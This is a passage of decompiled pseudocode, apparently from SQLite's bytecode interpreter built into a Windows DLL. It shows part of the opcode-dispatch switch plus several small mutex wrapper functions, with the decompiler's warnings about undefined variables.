      case 0x5Fu:
        LODWORD(v352) = 0;
        v248 = sub_10065FB3(
                 *(_DWORD *)(16 * *((_DWORD *)v9 + 2) + v7[2] + 4),
                 *((_DWORD *)v9 + 1),
                 *((_DWORD *)v9 + 3) != 0 ? &v352 : 0);
        v249 = (int)v349;
        v94 = *((_DWORD *)v349 + 3) == 0;
        v365 = v248;
        if ( v94 )
          goto LABEL_58;
        LODWORD(v250) = v352;
        *(_DWORD *)(v1 + 104) += v352;
        v251 = *(_DWORD *)(v249 + 12);
        if ( v251 <= 0 )
          goto LABEL_58;
        v252 = (_QWORD *)(v361 + 40 * v251);
        v250 = (int)v250;
LABEL_677:
        *v252 += v250;
        goto LABEL_58;
      case 0x60u:
      case 0x61u:
        LODWORD(v352) = 0;
        DWORD2(v352) = v7[2] + 16 * *((_DWORD *)v9 + 1);
        DWORD1(v352) = *v9 != 97 ? 2 : 5;
        v365 = sub_10065E71(*(_DWORD *)(DWORD2(v352) + 4), (unsigned int *)&v352, SDWORD1(v352));
LABEL_406:
        v21 = v352;
        goto LABEL_28;
      case 0x62u:
        LODWORD(v352) = *((_DWORD *)v9 + 1);
        sub_10068CBC((int)v7);
        if ( *((_DWORD *)v9 + 2) || (*(_BYTE *)(*(_DWORD *)(16 * v352 + v7[2] + 12) + 74) & 1) != 0 )
        {
          DWORD1(v352) = aSqliteTempMast_0;
          if ( (_DWORD)v352 != 1 )
            DWORD1(v352) = aSqliteMaster_0;
          HIDWORD(v352) = v7;
          *(_DWORD *)v353 = *((_DWORD *)v9 + 1);
          *(_DWORD *)&v353[4] = v1 + 92;
          DWORD2(v352) = sub_10055484(
                           (int)v7,
                           aSelectNameRoot_0,
                           *(_DWORD *)(16 * v352 + v7[2]),
                           DWORD1(v352),
                           *((_DWORD *)v9 + 4));
          if ( DWORD2(v352) )
          {
            v253 = v364;
            *((_BYTE *)v364 + 124) = 1;
            *(_DWORD *)&v353[8] = 0;
            v365 = sub_100721DE(
                     (int)v253,
                     (char *)DWORD2(v352),
                     (int (__cdecl *)(int, int, _DWORD *, _DWORD *))sub_10057FF0,
                     (int)&v352 + 12,
                     0);
            if ( !v365 )
              v365 = *(_DWORD *)&v353[8];
            sub_10058EC7((int)v253, DWORD2(v352));
            *((_BYTE *)v253 + 124) = 0;
          }
          else
          {
            v365 = 7;
          }
          v1 = (int)a1;
        }
        sub_10068D45((int)v364);
        if ( v365 == 7 )
          goto LABEL_828;
        goto LABEL_58;
      case 0x64u:
        v254 = (_BYTE *)*((_DWORD *)v9 + 4);
        v255 = v7[2] + 16 * *((_DWORD *)v9 + 1);
        v256 = sub_10059297(v254);
        v258 = sub_10069032((unsigned int *)(*(_DWORD *)(v255 + 12) + 4), v257, (int)v256, 0);
        sub_1006A1BB((unsigned int)v258);
        v364[3] |= 0x200u;
        goto LABEL_58;
      case 0x65u:
        sub_10069FBC(*((unsigned __int8 **)v9 + 4), (int)v7);
        goto LABEL_58;
      case 0x66u:
        sub_10073048(*((unsigned __int8 **)v9 + 4), (int)v7);
        goto LABEL_58;
      case 0x67u:
        LODWORD(v352) = *((_DWORD *)v9 + 2);
        v259 = 0;
        DWORD1(v352) = sub_10059073((int)v7, 4 * v352 + 4);
        if ( !DWORD1(v352) )
          goto LABEL_827;
        *(_DWORD *)&v353[4] = v361 + 40 * *((_DWORD *)v9 + 3);
        v260 = v361 + 40 * *((_DWORD *)v9 + 1);
        DWORD2(v352) = 0;
        if ( (int)v352 > 0 )
        {
          do
          {
            v261 = sub_1005A03A(v260 + 40 * v259);
            *(_DWORD *)(DWORD1(v352) + 4 * DWORD2(v352)) = v261;
            v259 = ++DWORD2(v352);
          }
          while ( SDWORD2(v352) < (int)v352 );
        }
        *(_DWORD *)(DWORD1(v352) + 4 * v259) = 0;
        v262 = v364;
        *(_DWORD *)v353 = sub_100669D1(
                            *(_DWORD *)(16 * v9[3] + v364[2] + 4),
                            SDWORD1(v352),
                            v352,
                            **(_DWORD **)&v353[4],
                            (_DWORD *)&v352 + 3);
        sub_10058EC7((int)v262, DWORD1(v352));
        v263 = SHIDWORD(v352);
        v264 = **(_DWORD **)&v353[4] < HIDWORD(v352);
        **(_DWORD **)&v353[4] -= HIDWORD(v352);
        *(_DWORD *)(*(_DWORD *)&v353[4] + 4) -= v264 + HIDWORD(v263);
        sub_1005A1F4(v260);
        if ( !HIDWORD(v352) )
          goto LABEL_700;
        if ( !*(_DWORD *)v353 )
          goto LABEL_827;
        sub_1005A3FE((void (__cdecl *)(int, unsigned int))sub_10058E74, v260, -1, *(_BYTE **)v353, 1);
LABEL_700:
        sub_10059D24(v260, (unsigned __int8)v351);
        goto LABEL_57;
      case 0x68u:
        v265 = v8 + 40 * *((_DWORD *)v9 + 1);
        v266 = (__int64 *)(v8 + 40 * *((_DWORD *)v9 + 2));
        if ( (*(_BYTE *)(v265 + 28) & 0x20) == 0 )
        {
          sub_1005A2D8(v265);
          if ( (*(_BYTE *)(v265 + 28) & 0x20) == 0 )
            goto LABEL_828;
        }
        sub_100724EC(*(_DWORD *)v265, *v266);
        goto LABEL_58;
      case 0x69u:
        if ( !v7[54] )
        {
          v267 = v8 + 40 * *((_DWORD *)v9 + 1);
          if ( (*(_BYTE *)(v267 + 28) & 0x20) == 0
            || (v346 = *(_DWORD *)v267, sub_10072726(v346), v268 = v346, (v269 = *(_QWORD **)(v346 + 8)) == 0) )
          {
            sub_1005A1F4(v267);
LABEL_14:
            v10 = *((_DWORD *)v9 + 2);
LABEL_15:
            v362 = v10 - 1;
            goto LABEL_58;
          }
          *(_QWORD *)&v352 = *v269;
          v270 = *(_DWORD *)(*(_DWORD *)(v346 + 8) + 8);
          *(_DWORD *)(v346 + 8) = v270;
          if ( !v270 )
            sub_100724B9(v268);
          sub_1005A280(v361 + 40 * *((_DWORD *)v9 + 3), v352, SDWORD1(v352));
          goto LABEL_57;
        }
LABEL_845:
        v2 = v7;
        goto LABEL_846;
      case 0x6Au:
        v271 = *((_DWORD *)v9 + 3);
        v272 = 40 * *((_DWORD *)v9 + 1);
        v273 = *((_DWORD *)v9 + 4);
        v274 = v8 + v272;
        LODWORD(v352) = v273;
        v94 = (*(_BYTE *)(v274 + 28) & 0x20) == 0;
        v350 = v8 + 40 * v271;
        if ( !v94 )
          goto LABEL_714;
        sub_1005A2D8(v274);
        if ( (*(_BYTE *)(v274 + 28) & 0x20) == 0 )
          goto LABEL_828;
        v273 = v352;
LABEL_714:
        if ( !v273 )
          goto LABEL_721;
        if ( v273 < 0 )
          v275 = -1;
        else
          v275 = v273 & 0xF;
        DWORD1(v352) = sub_10072766(*(_DWORD *)v274, v275, *(_QWORD *)v350);
        if ( DWORD1(v352) )
        {
          v13 = *((_DWORD *)v349 + 2);
LABEL_17:
          v14 = v13 - 1;
LABEL_18:
          v362 = v14;
        }
        else if ( (int)v352 >= 0 )
        {
LABEL_721:
          sub_100724EC(*(_DWORD *)v274, *(_QWORD *)v350);
        }
        goto LABEL_58;
      case 0x6Bu:
        *(_DWORD *)&v353[8] = *((_DWORD *)v9 + 4);
        v276 = v8 + 40 * *((_DWORD *)v9 + 3);
        v277 = *(_DWORD *)&v353[8];
        DWORD2(v352) = v276;
        if ( !v9[3] )
          goto LABEL_728;
        *(_DWORD *)&v353[12] = *(_DWORD *)(*(_DWORD *)&v353[8] + 20);
        *(_DWORD *)&v353[4] = *(_DWORD *)(v1 + 204);
        v278 = *(_DWORD *)&v353[4];
        if ( !*(_DWORD *)&v353[4] )
          goto LABEL_728;
        do
        {
          if ( *(_DWORD *)(v278 + 32) == *(_DWORD *)&v353[12] )
            break;
          v278 = *(_DWORD *)(v278 + 60);
          *(_DWORD *)&v353[4] = v278;
        }
        while ( v278 );
        if ( v278 )
          goto LABEL_58;
        v277 = *(_DWORD *)&v353[8];
LABEL_728:
        if ( *(_DWORD *)(v1 + 208) < v7[28] )
        {
          if ( (*(_BYTE *)(v276 + 28) & 0x40) != 0 )
          {
            v279 = *(_DWORD *)v276;
            *(_DWORD *)&v353[4] = v279;
          }
          else
          {
            LODWORD(v352) = *(_DWORD *)(v277 + 12) + *(_DWORD *)(v277 + 8);
            DWORD1(v352) = 4 * (*(_DWORD *)(v277 + 12) + 10 * v352) + 64;
            *(_DWORD *)&v353[4] = sub_1005904B((int)v7, DWORD1(v352));
            if ( !*(_DWORD *)&v353[4] )
              goto LABEL_828;
            sub_10059FC7((int *)DWORD2(v352));
            *(_WORD *)(DWORD2(v352) + 28) = 64;
            *(_DWORD *)DWORD2(v352) = *(_DWORD *)&v353[4];
            **(_DWORD **)&v353[4] = v1;
            *(_DWORD *)(*(_DWORD *)&v353[4] + 36) = v352;
            *(_DWORD *)(*(_DWORD *)&v353[4] + 40) = *(_DWORD *)(*(_DWORD *)&v353[8] + 12);
            *(_DWORD *)(*(_DWORD *)&v353[4] + 4) = v362;
            *(_DWORD *)(*(_DWORD *)&v353[4] + 16) = *(_DWORD *)(v1 + 76);
            *(_DWORD *)(*(_DWORD *)&v353[4] + 20) = *(_DWORD *)(v1 + 72);
            *(_DWORD *)(*(_DWORD *)&v353[4] + 24) = *(_DWORD *)(v1 + 52);
            *(_WORD *)(*(_DWORD *)&v353[4] + 28) = *(_WORD *)(v1 + 50);
            *(_DWORD *)(*(_DWORD *)&v353[4] + 8) = *(_DWORD *)(v1 + 20);
            *(_DWORD *)(*(_DWORD *)&v353[4] + 12) = *(_DWORD *)(v1 + 12);
            *(_DWORD *)(*(_DWORD *)&v353[4] + 32) = *(_DWORD *)(*(_DWORD *)&v353[8] + 20);
            v279 = *(_DWORD *)&v353[4];
            v280 = *(_DWORD *)&v353[4] + 64;
            *(_DWORD *)v353 = 40 * *(_DWORD *)(*(_DWORD *)&v353[4] + 36) + *(_DWORD *)&v353[4] + 64;
            HIDWORD(v352) = *(_DWORD *)&v353[4] + 64;
            if ( *(_DWORD *)&v353[4] + 64 != *(_DWORD *)v353 )
            {
              do
              {
                *(_WORD *)(v280 + 28) = 1;
                *(_DWORD *)(HIDWORD(v352) + 16) = v7;
                v280 = HIDWORD(v352) + 40;
                HIDWORD(v352) += 40;
              }
              while ( HIDWORD(v352) != *(_DWORD *)v353 );
              v279 = *(_DWORD *)&v353[4];
            }
          }
          ++*(_DWORD *)(v1 + 208);
          *(_DWORD *)(v279 + 60) = *(_DWORD *)(v1 + 204);
          *(_QWORD *)(*(_DWORD *)&v353[4] + 48) = *((_QWORD *)v7 + 6);
          *(_DWORD *)(*(_DWORD *)&v353[4] + 56) = *(_DWORD *)(v1 + 104);
          v281 = *(_DWORD *)&v353[4];
          *(_DWORD *)(v1 + 104) = 0;
          *(_DWORD *)(v1 + 204) = v281;
          *(_DWORD *)(v1 + 76) = v281 + 24;
          v282 = *(_DWORD *)(v281 + 36);
          *(_DWORD *)(v1 + 72) = v282;
          *(_WORD *)(v1 + 50) = *(_WORD *)(v281 + 40);
          v362 = -1;
          v361 = v281 + 24;
          v283 = *(int **)&v353[8];
          *(_DWORD *)(v1 + 52) = v281 + 24 + 40 * (v282 + 1);
          v342 = *v283;
          *(_DWORD *)(v1 + 20) = v342;
          *(_DWORD *)(v1 + 12) = v283[1];
        }
        else
        {
          v365 = 1;
          sub_10059206((unsigned int *)(v1 + 92), (int)v7, aTooManyLevelsO);
        }
        goto LABEL_58;
      case 0x6Cu:
        LODWORD(v352) = *(_DWORD *)(v1 + 204);
        v43 = *(_DWORD *)(v352 + 16)
            + 40 * (*((_DWORD *)v9 + 1) + *(_DWORD *)(20 * *(_DWORD *)(v352 + 4) + *(_DWORD *)(v352 + 8) + 4));
        v42 = v363;
        DWORD1(v352) = v43;
LABEL_56:
        sub_1005A356(v43, (int)v42, 4096);
        goto LABEL_57;
      case 0x6Du:
        v250 = *((int *)v9 + 2);
        if ( *((_DWORD *)v9 + 1) )
          v252 = v7 + 116;
        else
          v252 = (_QWORD *)(v1 + 184);
        goto LABEL_677;
      case 0x6Eu:
        if ( *((_DWORD *)v9 + 1) )
          v111 = *((_QWORD *)v7 + 58) == 0i64;
        else
          v111 = *(_QWORD *)(v1 + 184) == 0i64;
        goto LABEL_230;
      case 0x6Fu:
        v284 = *(_DWORD *)(v1 + 204);
        if ( v284 )
        {
          do
          {
            v285 = v284;
            DWORD1(v352) = v284;
            v284 = *(_DWORD *)(v284 + 60);
          }
          while ( v284 );
          v286 = *(_DWORD *)(v285 + 16) + 40 * *((_DWORD *)v9 + 1);
        }
        else
        {
          v286 = v8 + 40 * *((_DWORD *)v9 + 1);
        }
        LODWORD(v352) = v286;
        sub_1005A15D(v286);
        v287 = (__int64 *)(v361 + 40 * *((_DWORD *)v9 + 2));
        sub_1005A15D((int)v287);
        v288 = *v287;
        if ( *(_QWORD *)v352 < v288 )
          *(_QWORD *)v352 = v288;
        goto LABEL_58;
      case 0x70u:
        if ( *(__int64 *)(40 * *((_DWORD *)v9 + 1) + v8) > 0 )
          goto LABEL_14;
        goto LABEL_58;
      case 0x71u:
        v289 = 40 * *((_DWORD *)v9 + 1);
        if ( *(int *)(v289 + v8 + 4) > 0 || *(int *)(v289 + v8 + 4) >= 0 )
          goto LABEL_58;
        goto LABEL_14;
      case 0x72u:
        v290 = (_DWORD *)(v8 + 40 * *((_DWORD *)v9 + 1));
        v291 = *((int *)v9 + 3);
        v264 = __CFADD__((_DWORD)v291, *v290);
        *v290 += v291;
        LODWORD(v291) = *v290;
        v290[1] += HIDWORD(v291) + v264;
        v111 = (v290[1] | (unsigned int)v291) == 0;
        goto LABEL_230;
      case 0x73u:
        *(_QWORD *)&v352 = v9[3];
        v292 = v8 + 40 * *((_DWORD *)v9 + 2);
        v293 = *(_DWORD *)(v1 + 36);
        HIDWORD(v352) = v292;
        *(_DWORD *)&v353[64] = v293;
        if ( (int)v352 > 0 )
        {
          do
          {
            *(_DWORD *)(*(_DWORD *)&v353[64] + 4 * DWORD1(v352)) = v292;
            sub_1005C69B(SHIDWORD(v352));
            ++DWORD1(v352);
            v292 = HIDWORD(v352) + 40;
            HIDWORD(v352) += 40;
          }
          while ( SDWORD1(v352) < (int)v352 );
        }
        *(_DWORD *)v353 = *((_DWORD *)v9 + 4);
        DWORD2(v352) = v361 + 40 * *((_DWORD *)v9 + 3);
        *(_DWORD *)&v353[48] = DWORD2(v352);
        ++*(_DWORD *)(DWORD2(v352) + 24);
        *(_DWORD *)&v353[24] = v364;
        *(_WORD *)&v353[36] = 1;
        *(_DWORD *)&v353[28] = 0;
        *(_DWORD *)&v353[44] = 0;
        *(_DWORD *)&v353[40] = 0;
        *(_DWORD *)&v353[52] = 0;
        *(_DWORD *)&v353[56] = 0;
        if ( (*(_BYTE *)(*(_DWORD *)v353 + 3) & 8) != 0 )
          *(_DWORD *)&v353[56] = *((_DWORD *)v9 - 1);
        (*(void (__cdecl **)(_BYTE *, _DWORD, _DWORD))(*(_DWORD *)v353 + 16))(v353, v352, *(_DWORD *)&v353[64]);
        if ( *(_DWORD *)&v353[52] )
        {
          v294 = (const char *)sub_100530C6((int)&v353[8]);
          sub_10059206((unsigned int *)(v1 + 92), (int)v364, "%s", v294);
          v365 = *(_DWORD *)&v353[52];
        }
        sub_10059FC7((int *)&v353[8]);
        goto LABEL_58;
      case 0x74u:
        LODWORD(v352) = v361 + 40 * *((_DWORD *)v9 + 1);
        v365 = sub_10059F0A(*((_DWORD *)v9 + 4), v352);
        if ( v365 )
        {
          v295 = (const char *)sub_100530C6(v352);
          sub_10059206(a1 + 23, (int)v364, "%s", v295);
        }
        sub_10059D24(v352, (unsigned __int8)v351);
        v296 = v352;
        goto LABEL_766;
      case 0x75u:
        if ( !*((_BYTE *)v7 + 28) )
        {
          sub_10059206((unsigned int *)(v1 + 92), (int)v7, aCannotVacuumFr);
          goto LABEL_394;
        }
        v365 = sub_10073720((int)v7);
        goto LABEL_57;
      case 0x76u:
        LODWORD(v352) = *(_DWORD *)(16 * *((_DWORD *)v9 + 1) + v7[2] + 4);
        v365 = sub_10062FDF(v352);
        if ( v365 == 101 )
        {
          v299 = *((_DWORD *)v9 + 2) - 1;
          v365 = 0;
          v362 = v299;
        }
        goto LABEL_58;
      case 0x77u:
        if ( *((_DWORD *)v9 + 1) )
          *(_BYTE *)(v1 + 98) = 1;
        else
          sub_1005C640((int)v7);
        goto LABEL_58;
      case 0x78u:
        v300 = v9[12];
        if ( v300 || (v7[3] & 0x80000) == 0 )
        {
          v365 = sub_10066C60(v300, *(_DWORD *)(16 * *((_DWORD *)v9 + 1) + v7[2] + 4), *((_DWORD *)v9 + 2));
          if ( (_BYTE)v365 == 6 )
            sub_10059206((unsigned int *)(v1 + 92), (int)v364, "database table is locked: %s", *((const char **)v9 + 4));
        }
        goto LABEL_58;
      case 0x79u:
        LODWORD(v352) = *((_DWORD *)v9 + 4);
        v365 = sub_10071706(v352, (int)v7);
        if ( !(_DWORD)v352 )
          goto LABEL_58;
        sub_10058EC7((int)v7, *(_DWORD *)(v1 + 92));
        v301 = v352;
        *(_DWORD *)(v1 + 92) = *(_DWORD *)(*(_DWORD *)(v352 + 8) + 8);
        v302 = *(_DWORD *)(v301 + 8);
LABEL_788:
        *(_DWORD *)(v302 + 8) = 0;
        goto LABEL_58;
      case 0x7Au:
        v131 = sub_10071538(*((_DWORD *)v9 + 1), (int)v7, *((unsigned __int8 **)v9 + 4), (int *)(v1 + 92));
        goto LABEL_790;
      case 0x7Bu:
        *(_BYTE *)(v1 + 100) = 2;
        v365 = sub_100715D0(*((_DWORD *)v9 + 1), (int)v7, *((unsigned __int8 **)v9 + 4));
        *(_BYTE *)(v1 + 100) = 0;
        goto LABEL_58;
      case 0x7Cu:
        *(_QWORD *)&v352 = 0i64;
        DWORD2(v352) = *(_DWORD *)(*((_DWORD *)v9 + 4) + 8);
        HIDWORD(v352) = *(_DWORD *)DWORD2(v352);
        v303 = (*(int (__cdecl **)(_DWORD, char *))(HIDWORD(v352) + 24))(DWORD2(v352), (char *)&v352 + 4);
        v327 = *(_DWORD *)(v1 + 92);
        v365 = v303;
        sub_10058EC7((int)v7, v327);
        v304 = DWORD2(v352);
        *(_DWORD *)(v1 + 92) = *(_DWORD *)(DWORD2(v352) + 8);
        *(_DWORD *)(v304 + 8) = 0;
        if ( !v365 )
        {
          *(_DWORD *)DWORD1(v352) = DWORD2(v352);
          v305 = sub_1005C6C7((_DWORD *)v1, *((_DWORD *)v9 + 1), 0, -1, 0);
          LODWORD(v352) = v305;
          if ( v305 )
          {
            v305[14] = DWORD1(v352);
            *(_DWORD *)(v352 + 60) = **(_DWORD **)DWORD1(v352);
          }
          else
          {
            *((_BYTE *)v7 + 30) = 1;
            (*(void (__cdecl **)(_DWORD))(HIDWORD(v352) + 28))(DWORD1(v352));
          }
        }
        goto LABEL_58;
      case 0x7Du:
        v306 = *(_DWORD *)(v1 + 52);
        HIDWORD(v352) = v8 + 40 * *((_DWORD *)v9 + 3);
        *(_DWORD *)v353 = HIDWORD(v352) + 40;
        *(_DWORD *)&v353[12] = *(_DWORD *)(v306 + 4 * *((_DWORD *)v9 + 1));
        v307 = *(_DWORD **)(*(_DWORD *)&v353[12] + 56);
        *(_DWORD *)&v353[4] = v307;
        *(_DWORD *)&v353[8] = *v307;
        DWORD2(v352) = **(_DWORD **)&v353[8];
        LODWORD(v352) = *(_DWORD *)(HIDWORD(v352) + 40);
        DWORD1(v352) = *(_DWORD *)HIDWORD(v352);
        v308 = *(_DWORD *)(v1 + 36);
        *(_QWORD *)&v353[16] = 0i64;
        *(_DWORD *)&v353[24] = v308;
        if ( (int)v352 > 0 )
        {
          do
          {
            *(_DWORD *)(*(_DWORD *)&v353[24] + 4 * v6) = *(_DWORD *)v353 + 40 * (v6 + 1);
            sub_1005C69B(*(_DWORD *)(*(_DWORD *)&v353[24] + 4 * *(_DWORD *)&v353[20]));
            v6 = ++*(_DWORD *)&v353[20];
          }
          while ( *(int *)&v353[20] < (int)v352 );
          v307 = *(_DWORD **)&v353[4];
        }
        v333 = *(_DWORD *)&v353[24];
        v309 = DWORD2(v352);
        v329 = v352;
        *(_BYTE *)(v1 + 100) = 1;
        v310 = (*(int (__cdecl **)(_DWORD *, _DWORD, _DWORD, int, int))(v309 + 32))(
                 v307,
                 DWORD1(v352),
                 *((_DWORD *)v9 + 4),
                 v329,
                 v333);
        v334 = *(_DWORD *)(v1 + 92);
        v365 = v310;
        v330 = v364;
        *(_BYTE *)(v1 + 100) = 0;
        sub_10058EC7((int)v330, v334);
        v311 = *(_DWORD *)&v353[8];
        v94 = v365 == 0;
        *(_DWORD *)(v1 + 92) = *(_DWORD *)(*(_DWORD *)&v353[8] + 8);
        *(_DWORD *)(v311 + 8) = 0;
        if ( v94 )
          *(_DWORD *)&v353[16] = (*(int (__cdecl **)(_DWORD))(DWORD2(v352) + 40))(*(_DWORD *)&v353[4]);
        if ( *(_DWORD *)&v353[16] )
          v362 = *((_DWORD *)v9 + 2) - 1;
        *(_BYTE *)(*(_DWORD *)&v353[12] + 20) = 0;
        goto LABEL_58;
      case 0x7Eu:
        v312 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        v54 = (int *)(v8 + 40 * *((_DWORD *)v9 + 3));
        DWORD2(v352) = v54;
        if ( *(_BYTE *)(v312 + 20) )
          goto LABEL_118;
        LODWORD(v352) = **(_DWORD **)(v312 + 56);
        DWORD1(v352) = *(_DWORD *)v352;
        memset(v353, 0, 0x40u);
        sub_1005A3D5(SDWORD2(v352), (int *)&v353[8]);
        *(_WORD *)&v353[36] = *(_WORD *)&v353[36] & 0xFF00 | 1;
        v313 = (*(int (__cdecl **)(_DWORD, _BYTE *, _DWORD))(DWORD1(v352) + 44))(
                 *(_DWORD *)(v312 + 56),
                 v353,
                 *((_DWORD *)v9 + 2));
        v335 = a1[23];
        v365 = v313;
        sub_10058EC7((int)v364, v335);
        v314 = v352;
        a1[23] = *(_DWORD *)(v352 + 8);
        *(_DWORD *)(v314 + 8) = 0;
        if ( *(_DWORD *)&v353[52] )
          v365 = *(_DWORD *)&v353[52];
        sub_10059D24((int)&v353[8], (unsigned __int8)v351);
        sub_1005A3D5((int)&v353[8], (int *)DWORD2(v352));
        v296 = DWORD2(v352);
LABEL_766:
        if ( !sub_1005A33C(v296) )
          goto LABEL_57;
        v1 = (int)a1;
        goto LABEL_768;
      case 0x7Fu:
        DWORD2(v352) = 0;
        v315 = *(_DWORD *)(*(_DWORD *)(v1 + 52) + 4 * *((_DWORD *)v9 + 1));
        HIDWORD(v352) = v315;
        if ( *(_BYTE *)(v315 + 20) )
          goto LABEL_58;
        LODWORD(v352) = **(_DWORD **)(v315 + 56);
        DWORD1(v352) = *(_DWORD *)v352;
        v316 = DWORD1(v352);
        *(_BYTE *)(v1 + 100) = 1;
        v317 = (*(int (__cdecl **)(_DWORD))(v316 + 36))(*(_DWORD *)(v315 + 56));
        v336 = *(_DWORD *)(v1 + 92);
        v365 = v317;
        *(_BYTE *)(v1 + 100) = 0;
        sub_10058EC7((int)v7, v336);
        v318 = v352;
        *(_DWORD *)(v1 + 92) = *(_DWORD *)(v352 + 8);
        *(_DWORD *)(v318 + 8) = 0;
        if ( !v365 )
          DWORD2(v352) = (*(int (__cdecl **)(_DWORD))(DWORD1(v352) + 40))(*(_DWORD *)(HIDWORD(v352) + 56));
        v111 = DWORD2(v352) == 0;
        goto LABEL_230;
      case 0x80u:
        LODWORD(v352) = *(_DWORD *)(*((_DWORD *)v9 + 4) + 8);
        DWORD1(v352) = v361 + 40 * *((_DWORD *)v9 + 1);
        v319 = (*(int (__cdecl **)(_DWORD, _DWORD))(*(_DWORD *)v352 + 76))(v352, *(_DWORD *)(DWORD1(v352) + 20));
        v328 = *(_DWORD *)(v1 + 92);
        v365 = v319;
        sub_10058EC7((int)v7, v328);
        v302 = v352;
        *(_DWORD *)(v1 + 92) = *(_DWORD *)(v352 + 8);
        goto LABEL_788;
      case 0x81u:
        LODWORD(v352) = *(_DWORD *)(*((_DWORD *)v9 + 4) + 8);
        DWORD1(v352) = *(_DWORD *)v352;
        DWORD2(v352) = *((_DWORD *)v9 + 2);
        if ( *(_DWORD *)(DWORD1(v352) + 52) )
        {
          *(_DWORD *)&v353[8] = *(_DWORD *)(v1 + 36);
          v320 = v8 + 40 * *((_DWORD *)v9 + 3);
          *(_DWORD *)&v353[12] = v320;
          HIDWORD(v352) = 0;
          if ( SDWORD2(v352) > 0 )
          {
            do
            {
              sub_1005C69B(v320);
              *(_DWORD *)(*(_DWORD *)&v353[8] + 4 * HIDWORD(v352)) = *(_DWORD *)&v353[12];
              v320 = *(_DWORD *)&v353[12] + 40;
              v6 = ++HIDWORD(v352);
              *(_DWORD *)&v353[12] += 40;
            }
            while ( SHIDWORD(v352) < SDWORD2(v352) );
          }
          v321 = (*(int (__thiscall **)(int, _DWORD, _DWORD, _DWORD, _BYTE *))(DWORD1(v352) + 52))(
                   v6,
                   v352,
                   DWORD2(v352),
                   *(_DWORD *)&v353[8],
                   v353);
          v325 = *(_DWORD *)(v1 + 92);
          v365 = v321;
          sub_10058EC7((int)v7, v325);
          v322 = v352;
          *(_DWORD *)(v1 + 92) = *(_DWORD *)(v352 + 8);
          *(_DWORD *)(v322 + 8) = 0;
          if ( !v365 && *((_DWORD *)v9 + 1) )
            *((_QWORD *)v7 + 6) = *(_QWORD *)v353;
LABEL_583:
          ++*(_DWORD *)(v1 + 104);
        }
        goto LABEL_58;
      case 0x82u:
        v25 = v363;
        *((_WORD *)v363 + 14) = 8;
        *((double *)v25 + 1) = *(double *)*((_DWORD *)v9 + 4);
        goto LABEL_58;
      case 0x83u:
        LODWORD(v352) = *((_DWORD *)v9 + 1);
        DWORD2(v352) = **(_DWORD **)(*(_DWORD *)(16 * v352 + v7[2] + 4) + 4);
        v1 = (int)a1;
        v365 = sub_1006DFE2((_DWORD *)&v352 + 1, SDWORD2(v352));
        if ( v365 )
          goto LABEL_58;
        v21 = DWORD1(v352);
LABEL_28:
        *(_QWORD *)v363 = v21;
        goto LABEL_58;
      case 0x8Du:
        v82 = v8 + 40 * *((_DWORD *)v9 + 1);
        v83 = *(_WORD *)(v82 + 28);
        if ( (v83 & 1) == 0 )
        {
          v332 = v351;
          *(_WORD *)(v82 + 28) = v83 | ((unsigned __int8)v83 >> 3) & 2;
          sub_1005C806(v82, 97, v332);
          v365 = 0;
          *(_WORD *)(v82 + 28) &= 0xFFE3u;
        }
        goto LABEL_58;
      case 0x8Eu:
        v84 = v8 + 40 * *((_DWORD *)v9 + 1);
        v85 = *(_WORD *)(v84 + 28);
        if ( (v85 & 1) != 0 )
          goto LABEL_58;
        if ( (v85 & 0x10) != 0 )
        {
          v86 = v85 & 0xFF10;
        }
        else
        {
          sub_1005C806(v84, 97, v351);
          v86 = *(_WORD *)(v84 + 28) & 0xFF00 | 0x10;
        }
        goto LABEL_157;
      case 0x8Fu:
        v87 = v8 + 40 * *((_DWORD *)v9 + 1);
        if ( (*(_BYTE *)(v87 + 28) & 0xD) == 0 )
          sub_1005A19D(v87);
        goto LABEL_58;
      case 0x90u:
        v88 = v8 + 40 * *((_DWORD *)v9 + 1);
        if ( (*(_BYTE *)(v88 + 28) & 1) == 0 )
          sub_1005A15D(v88);
        goto LABEL_58;
      case 0x91u:
        v81 = v8 + 40 * *((_DWORD *)v9 + 1);
        if ( (*(_BYTE *)(v81 + 28) & 1) == 0 )
LABEL_150:
          sub_1005A17E(v81);
        goto LABEL_58;
      default:
        goto LABEL_58;
    }
  }
}
// 1005CABA: variable 'v28' is possibly undefined
// 1005D3EC: variable 'v75' is possibly undefined
// 1005D3FF: variable 'v76' is possibly undefined
// 1005D869: variable 'v102' is possibly undefined
// 1005D89D: variable 'v103' is possibly undefined
// 1005D92A: variable 'v107' is possibly undefined
// 1005D967: variable 'v108' is possibly undefined
// 1005DD6D: variable 'v128' is possibly undefined
// 1005EB74: variable 'v172' is possibly undefined
// 1005EE7A: variable 'v178' is possibly undefined
// 1006003E: variable 'v257' is possibly undefined
// 10061028: variable 'v324' is possibly undefined

//----- (10061294) --------------------------------------------------------
int sub_10061294()
{
  int result; // eax

  result = 0;
  if ( dword_1018214C )
  {
    if ( !dword_10182188 )
    {
      memcpy(&dword_10182180, off_10180388, 8u);
      memcpy(&dword_1018218C, &off_10180394, 0x18u);
      dword_10182188 = (int)off_10180390;
    }
    return dword_10182180();
  }
  return result;
}
// 10182180: invalid function type has been ignored
// 10180388: using guessed type int (*off_10180388[2])();
// 10180390: using guessed type int (__cdecl *off_10180390)(int);
// 10180394: using guessed type void (__cdecl *off_10180394)(LPCRITICAL_SECTION lpCriticalSection, void *);
// 1018214C: using guessed type int dword_1018214C;
// 10182180: using guessed type int (*dword_10182180)(void);
// 10182188: using guessed type int dword_10182188;
// 1018218C: using guessed type int dword_1018218C;

//----- (100612DC) --------------------------------------------------------
int sub_100612DC()
{
  if ( dword_1018214C )
    return dword_10182188();
  else
    return 0;
}
// 10182188: invalid function type has been ignored
// 1018214C: using guessed type int dword_1018214C;
// 10182188: using guessed type int (*dword_10182188)(void);

//----- (100612F3) --------------------------------------------------------
int __cdecl sub_100612F3(int a1)
{
  int result; // eax

  if ( a1 )
    return dword_1018218C();
  return result;
}
// 1018218C: invalid function type has been ignored
// 1018218C: using guessed type int (*dword_1018218C)(void);

//----- (10061305) --------------------------------------------------------
int __cdecl sub_10061305(int a1)
{
  int result; // eax

  if ( a1 )
    return dword_10182190();
  return result;
}
// 10182190: using guessed type int (*dword_10182190)(void);

//----- (10061317) --------------------------------------------------------
int __cdecl sub_10061317(int a1)
{
  int result; // eax

  if ( a1 )
    return dword_10182198();
  return result;
}
// 10182198: using guessed type int (*dword_10182198)(void);

//----- (10061329) --------------------------------------------------------
void __cdecl sub_10061329(_DWORD *a1)
{
  int v1; // edi
